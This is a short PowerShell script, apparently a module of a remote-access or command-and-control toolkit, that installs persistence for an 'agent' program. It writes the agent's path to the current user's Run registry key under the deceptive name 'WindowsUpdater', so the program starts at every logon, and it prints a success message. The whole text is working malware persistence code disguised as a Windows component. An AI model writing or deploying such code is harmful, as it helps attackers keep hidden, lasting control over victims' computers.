param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdater"

Set-ItemProperty -Path $regPath -Name $regName -Value $agentPath

Write-Output "✅ Persistence added. Agent will run at next logon."